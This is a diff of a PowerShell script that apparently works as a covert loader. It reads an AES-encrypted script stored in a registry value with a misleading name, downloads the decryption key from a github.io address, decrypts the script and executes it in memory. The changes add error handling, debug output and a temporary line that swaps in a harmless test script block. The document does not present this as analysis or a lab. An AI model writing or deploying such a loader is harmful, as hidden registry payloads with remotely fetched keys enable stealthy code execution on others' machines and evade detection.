@@ -99,26 +99,50 @@ function Invoke-AESEncryption {
 
 function Get-EncryptedScript 
 {
-    $RegKeyRootPath="HKLM:\SOFTWARE\SoundIncorporated"
-    $RegKeyPath=Join-Path $RegKeyRootPath "Software\Controls\MediaSystems"
-    $RegKeyName="WinSec"
-    $Data=(Get-ItemProperty -Path $RegKeyPath -Name $RegKeyName).$RegKeyName
-    return $Data
+    try{
+        $RegKeyRootPath="HKLM:\SOFTWARE\SoundIncorporated"
+        $RegKeyPath=Join-Path $RegKeyRootPath "Software\Controls\MediaSystems"
+        $RegKeyName="WinSec"
+        $Data=(Get-ItemProperty -Path $RegKeyPath -Name $RegKeyName).$RegKeyName
+        return $Data
+    }
+    catch{
+        $Msg="Get-ClearScript  Ran into an issue: $($PSItem.ToString())"
+        write-Error $Msg 
+        return $null
+    } 
 }
 
 function Get-ClearScript 
 {
-    $SecPFile='https://vr972be716a04eb6.github.io/dat/ps.dat'
-    $Pass = $webclient.DownloadString($SecPFile)
-    $Pass = $Pass.substring(0,30)
+    try{
+        $webclient = New-Object Net.WebClient
+        $SecPFile='https://vr972be716a04eb6.github.io/dat/psaes.dat'
+        $Pass = $webclient.DownloadString($SecPFile)
+        $Pass = $Pass.substring(0,30)
 
-    $EncryptedScript=Get-EncryptedScript 
+        $EncryptedScript=Get-EncryptedScript 
 
-    $ScriptClear=Invoke-AESEncryption -Mode Decrypt -Key $Pass -Text $EncryptedScript
+        $ScriptClear=Invoke-AESEncryption -Mode Decrypt -Key $Pass -Text $EncryptedScript
 
-    return $ScriptClear
+        return $ScriptClear
+    }
+    catch{
+        $Msg="Get-ClearScript  Ran into an issue: $($PSItem.ToString())"
+        write-Error $Msg 
+        return $null
+    } 
+
 }
 
+Write-Host 'START' -f Red
 $ClearScript=Get-ClearScript 
+if($ClearScript -eq $null){
+    return
+}
+Write-Host '1' -f DarkYellow
 $ScriptBlock=[Scriptblock]::Create($ClearScript)
+$ScriptBlock=[Scriptblock]::Create('{Write-Host "testess" -f Cyan;}')
+Write-Host '2' -f DarkYellow
 Invoke-Command -ScriptBlock $ScriptBlock
+Write-Host 'END' -f Green
